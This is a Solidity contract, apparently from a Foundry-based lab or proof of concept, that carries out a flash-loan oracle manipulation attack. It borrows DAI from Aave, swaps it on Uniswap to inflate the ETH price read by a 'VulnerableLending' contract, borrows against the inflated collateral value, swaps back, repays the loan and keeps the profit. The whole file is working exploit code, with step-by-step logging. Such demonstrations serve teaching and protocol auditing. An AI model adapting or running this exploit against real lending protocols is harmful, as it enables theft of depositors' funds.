// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/console.sol";
import "../VulnerableLending.sol";
import "../interfaces/IUniswapV2Router02.sol";
import "../interfaces/ILendingPool.sol";
import "../interfaces/IERC20.sol";

contract OracleAttacker {
    VulnerableLending public lending;
    IUniswapV2Router02 public uniswapRouter;
    ILendingPool public aavePool;

    address public immutable WETH;
    address public immutable DAI;
    address public owner;

    constructor(
        address payable _lending,
        address _uniswapRouter,
        address _aavePool,
        address _weth,
        address _dai
    ) {
        lending = VulnerableLending(_lending);
        uniswapRouter = IUniswapV2Router02(_uniswapRouter);
        aavePool = ILendingPool(_aavePool);
        WETH = _weth;
        DAI = _dai;
        owner = msg.sender;
    }

    /**
     * @notice Initiates a flash loan from Aave to manipulate the oracle price
     * @param flashLoanAmount The amount of DAI to borrow via flash loan
     * @param collateralToDeposit The amount of ETH to deposit as collateral
     *
     * Requirements:
     * - The contract must have enough ETH balance to deposit as collateral
     * - The vulnerable lending protocol must have enough DAI liquidity to exploit
     * - Uniswap pool must have sufficient liquidity for swaps
     */

    function flash_loan(uint256 flashLoanAmount, uint256 collateralToDeposit) external {
        // Setup flash loan call
        address[] memory assets = new address[](1);
        assets[0] = DAI;

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = flashLoanAmount;

        uint256[] memory modes = new uint256[](1);
        modes[0] = 0; // 0 = no debt, must repay in same transaction

        bytes memory params = abi.encode(collateralToDeposit);

        ILendingPool(aavePool)
            .flashLoan(
                address(this),
                assets,
                amounts,
                modes,
                address(this),
                params,
                0 // referral code
            );
    }

    /**
     * @notice Aave flash loan callback that executes the oracle manipulation attack
     *
     * Attack flow:
     * 1. Receive flash loan of DAI
     * 2. Swap DAI → WETH (pushes ETH price UP)
     * 3. Deposit ETH collateral (worth MORE now)
     * 4. Borrow maximum DAI based on inflated price
     * 5. Swap WETH → DAI to restore price
     * 6. Repay flash loan
     * 7. Keep excess DAI as profit
     *
     * @param amounts The amounts of each asset being flash borrowed
     * @param premiums The fees to be paid for each asset
     * @param initiator The address that initiated the flash loan (should be this contract)
     * @param params Encoded parameters (contains collateralToDeposit amount)
     * @return True Returns true to signal that the execution is successful
     */

    function executeOperation(
        address[] calldata,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    )
        external
        returns (bool)
    {
        // Security checks
        require(msg.sender == address(aavePool), "Caller must be Aave");
        require(initiator == address(this), "Initiator must be this contract");

        console.log("  Received:", amounts[0] / 1e18, "DAI");
        console.log("  Premium:", premiums[0] / 1e18, "DAI\n");

        // Decode parameters
        uint256 collateralToDeposit = abi.decode(params, (uint256));

        // Record initial state
        uint256 priceInitial = lending.getETHPrice();

        // ----- Manipulate price UP by swapping DAI -> WETH -----
        console.log("[STEP 2] Swapping DAI -> WETH to push ETH price UP...");
        uint256 daiToSwap = (amounts[0] * 80) / 100; // Use 80% of flash loan
        console.log("  Swapping:", daiToSwap / 1e18, "DAI -> WETH");
        // Approve router
        IERC20(DAI).approve(address(uniswapRouter), daiToSwap);
        // Build path
        address[] memory path = new address[](2);
        path[0] = DAI;
        path[1] = WETH;
        // Execute swap
        uint256[] memory amountsOut = uniswapRouter.swapExactTokensForTokens(
            daiToSwap,
            0, // Accept any amount
            path,
            address(this),
            block.timestamp
        );

        uint256 wethReceived = amountsOut[1];
        console.log("  Received:", wethReceived / 1e18, "WETH");
        uint256 priceManipulated = lending.getETHPrice();
        console.log("  New ETH price:", priceManipulated / 1e18, "DAI per ETH");
        console.log(
            "  Price increased by:", (priceManipulated - priceInitial) * 100 / priceInitial, "%\n"
        );

        // ----- STEP 2: Deposit collateral at inflated price -----
        console.log("[STEP 3] Depositing ETH collateral at inflated price...");
        console.log("  Depositing:", collateralToDeposit / 1e18, "ETH");

        lending.depositCollateral{ value: collateralToDeposit }();

        uint256 collateralValue = (collateralToDeposit * priceManipulated) / 1e18;
        console.log("  Collateral value at inflated price:", collateralValue / 1e18, "DAI\n");

        // ----- Borrow maximum DAI -----
        console.log("[STEP 4] Borrowing DAI at inflated price...");
        // Calculate how much we can borrow
        uint256 maxBorrow = (collateralValue * 100) / 150; // 150% collateral ratio
        console.log("  Can borrow up to:", maxBorrow / 1e18, "DAI");

        // Borrow as much as possible (but leave some buffer for safety)
        uint256 amountToBorrow = (maxBorrow * 95) / 100; // Borrow 95% of max
        console.log("  Borrowing:", amountToBorrow / 1e18, "DAI\n");

        lending.borrow(amountToBorrow);

        // ----- Restore price by swapping WETH -> DAI -----
        console.log("[STEP 5] Swapping WETH -> DAI to restore price...");

        uint256 wethBalance = IERC20(WETH).balanceOf(address(this));
        console.log("  Current WETH balance:", wethBalance / 1e18, "WETH");
        console.log("  Swapping back to restore price...");
        // Approve router
        IERC20(WETH).approve(address(uniswapRouter), wethBalance);
        // Build path
        path[0] = WETH;
        path[1] = DAI;
        // Execute swap
        uniswapRouter.swapExactTokensForTokens(wethBalance, 0, path, address(this), block.timestamp);

        uint256 priceFinal = lending.getETHPrice();
        console.log("  Price after restoration:", priceFinal / 1e18, "DAI per ETH\n");

        // ----- Repay flash loan -----
        console.log("[STEP 6] Repaying flash loan...");

        uint256 amountOwing = amounts[0] + premiums[0];
        uint256 currentDAI = IERC20(DAI).balanceOf(address(this));

        console.log("  Amount owed:", amountOwing / 1e18, "DAI");
        console.log("  Current DAI balance:", currentDAI / 1e18, "DAI");

        require(currentDAI >= amountOwing, "Not enough DAI to repay flash loan");

        // Approve Aave to take the loan + premium
        IERC20(DAI).approve(address(aavePool), amountOwing);

        uint256 profit = currentDAI - amountOwing;
        console.log("  Repaying flash loan: ", amountOwing / 1e18, "DAI");
        console.log("  Profit remaining:", profit / 1e18, "DAI\n");

        return true;
    }
}
